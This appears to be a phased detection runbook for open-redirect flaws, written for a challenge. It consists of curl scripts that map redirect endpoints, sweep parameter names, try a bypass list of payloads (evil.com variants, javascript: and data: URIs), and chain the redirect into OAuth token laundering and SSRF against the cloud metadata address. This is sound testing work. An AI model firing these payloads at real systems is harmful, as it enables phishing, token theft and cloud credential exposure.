# Detection playbook — the full ordered detection runbook

## Phase 1 — map the redirect surface

```bash
# the endpoint inventory
for ep in /login /logout /signin /signout /auth/login /oauth/authorize \
  /oauth/callback /sso /saml/acs /oidc/callback /out /goto /link /r /u \
  /redirect /return /back /previous /error /401 /403 /404 /checkout \
  /payment/success /payment/cancel /img /fetch /proxy /thumb /feed \
  /share /qr /deeplink /wizard /form /register; do
  code=$(curl -si -o /dev/null -w '%{http_code}' --max-time 5 "$BASE$ep")
  echo "$code $ep"
done
```

## Phase 2 — the param vocabulary sweep

```bash
PARAMS="next url redir redirect redirect_uri redirect_url return returnTo \
  returnto return_url goto dest destination target continue out view \
  callback to forward link ref referer site host path location uri \
  post_logout_redirect_uri RelayState relay reply successUrl cancelUrl \
  back prev previous ret from landing image img src feed file doc"
for p in $PARAMS; do
  loc=$(curl -si --max-time 5 "$BASE/login?$p=https%3A%2F%2Fattacker.invalid" \
        | grep -i '^location' | head -1)
  [ -n "$loc" ] && echo "[SIGNAL] ?$p -> $loc"
done
```

## Phase 3 — the carrier check

```bash
# the Location header
curl -si "$BASE/login?next=/x" | grep -i '^location'
# the Refresh header
curl -si "$BASE/login?next=/x" | grep -i '^refresh'
# the meta refresh
curl -s "$BASE/login?next=/x" | grep -iE 'meta.*refresh'
# the JS nav
curl -s "$BASE/login?next=/x" | grep -iE 'location\.|window\.location'
# the DOM-source sink
curl -s "$BASE/app.js" | grep -oE 'location\.(href|replace|assign)\s*=\s*[^;]*'
```

## Phase 4 — the fingerprint

```bash
# the canary on the confirmed carrier
curl -si "$BASE/login?next=https%3A%2F%2Fattacker.invalid" | grep -i '^location'
# the fingerprint names the filter shape
```

## Phase 5 — the filter-shape arms

```bash
# the arms by the fingerprint — the filter-bypass corpus
for arm in '//evil.com' '/\evil.com' '\\evil.com' '/%5cevil.com' \
  'https://target.com@evil.com' 'evil.com\@target.com' \
  'https://evil.com%40target.com' 'https://target.com.evil.com' \
  'eviltarget.com' 'https://evil.com/target.com' 'https:evil.com' \
  'https%3a%2f%2fevil.com' 'https%253a%252f%252fevil.com' \
  'javascript:alert(1)' 'data:text/html,<script>x</script>'; do
  enc=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$arm")
  loc=$(curl -si --max-time 5 "$BASE/login?next=$enc" | grep -i '^location' | head -1)
  echo "$arm -> $loc"
done
```

## Phase 6 — the verdicts

```text
each arm's Location is the verdict-evidence — record the arm + the Location
a Location: <canary> -> post-probe confirms
a uniform Location: <safe> -> the class falsifier
```

## Phase 7 — the client-side + stored + Referer

```bash
# the client-side twin
curl -s "$BASE/x?url=https://attacker.invalid" | grep -iE 'refresh|location'
# the stored-redirect — the set-then-fire pair
curl -s -c c.txt "$BASE/register?return_to=https://attacker.invalid"
curl -si -b c.txt "$BASE/login" | grep -i '^location'
# the Referer-derived
curl -si -H "Referer: https://attacker.invalid" "$BASE/back" | grep -i '^location'
```

## Phase 8 — the chain-route

```bash
# the OAuth launder — the open-redirect on an allowlisted domain
curl -si "$OAUTH/authorize?client_id=X&redirect_uri=https%3A%2F%2Fallowlisted.com%2Fredirect%3Fnext%3Dhttps%253A%252F%252Fattacker.invalid" | grep -i location
# the SSRF-fetch-follow
curl -s "$BASE/fetch?url=http://target.com/redirect%3Fnext%3Dhttp%3A%2F%2F169.254.169.254%2F"
```

## The playbook-record

```text
the playbook's product: a surface-inventory + a fingerprint + the arms-
tried + the verdicts — the complete detection-ledger for the challenge
```
